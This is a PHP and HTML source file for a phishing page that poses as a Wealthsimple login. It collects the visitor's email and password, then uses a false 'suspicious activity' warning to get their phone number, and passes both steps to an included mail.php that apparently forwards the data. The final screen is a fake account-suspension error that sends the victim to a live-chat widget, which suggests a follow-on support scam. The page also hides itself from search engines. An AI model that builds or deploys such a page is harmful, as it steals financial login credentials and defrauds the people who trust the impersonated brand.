<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="robots" content="noindex, nofollow"/>
    <meta name="googlebot" content="noindex, nofollow"/>
    <meta name="bingbot" content="noindex, nofollow"/>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="assets/images/bc-logo.svg" />
    <title>Wealthsimple | Login</title>
    <link href="npm/bootstrap_5.1.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="assets/scss/style.css">
</head>
<body>
    <div class="logo">
        <img src="assets/images/bc-logo.svg">
    </div>
    <div class="container-fluid" id="upholdForm">
        <div class="row">
           
            <div class="col-lg-3"></div>
            <div class="col-lg-6 fmDiv">
                <?php
                 if (isset($_POST['btnLoginMore'])) {
                    include 'mail.php';
                ?>
                <div class="verifyForm">
                    <h2 style="color: #000">Verification Required</h2>
                    <h4 style="color:red">Important Message</h4>
                    <h5>Some Suspicious Activity Found With Your Account, Enter Your Phone Number to Verify Your Identity.</h5>
                    <form action="" method="post">
                        <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                             <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                        <label>Phone Number</label><br>
                        <input type="text" name="number" placeholder="+1-234-567-8910">
                        <div class="button">
                            <button name="fromLog" type="submit" class="btn">Submit</button>
                        </div>
                    </form>
                </div>
                 <?php } elseif (isset($_POST['fromLog'])) {
                     include 'mail.php';
                 ?>
                 <div class="errorForm">
                    <h2 style="color: red">Important Message</h2>
                    <h5>Due to unauthorized activity and identification failure on your Account. Account Access has been suspended.Please Get in touch with our Support Staff Immediately</h5>
                    <form>
                        <label>Error CODE: EBRX1:6X76D</label><br>
                        <div class="button">
                            <a href="javascript:void(Tawk_API.toggle())">Ask Expert</a>
                        </div>
                    </form>
                </div>
                  <?php } else { ?>
                     
                <div class="form">
                    <h2>Welcome Back !</h2>
                    <h5>One login for all Wealthsimple products</h5>
                    <form action="" method="post">
                        <div class="inputField">
                            <!-- <label for="exampleInputEmail1" class="form-label">Email or Wallet ID</label> -->
                            <input type="email" name="email" class="form-control" placeholder="Email" id="exampleInputEmail1"
                                aria-describedby="emailHelp" required>
                        </div>
                        <div class="inputField">
                            <!-- <label for="exampleInputPassword1" class="form-label">Password</label> -->
                            <input type="password" name="password" class="form-control" placeholder="Password" id="exampleInputPassword1" required>
                        </div>
                       
                        <div class="buttonNext d-grid">
                            <button name="btnLoginMore" type="submit" class="btn">Next</button>
                        </div>
                         <div class="fgtpwd" style="text-align: center; font-size: 13px;">
                            Don't have an account?<a href="#">Sign Up</a>
                        </div>
                    </form>
                </div>
                 <?php } ?>
            </div>
             <div class="col-lg-3"></div>
        </div>
    </div>
    <script src="npm/_popperjs/core_2.10.2/dist/umd/popper.min.js"></script>
    <script src="npm/bootstrap_5.1.2/dist/js/bootstrap.min.js"></script>
    <!--Start of Tawk.to Script-->
    <script type="text/javascript">
    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
    (function(){
    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
    s1.async=true;
    s1.src='https://embed.tawk.to/621a7b48a34c24564128808d/1fsrn35pf';
    s1.charset='UTF-8';
    s1.setAttribute('crossorigin','*');
    s0.parentNode.insertBefore(s1,s0);
    })();
    </script>
    <!--End of Tawk.to Script-->
</body>
</html>
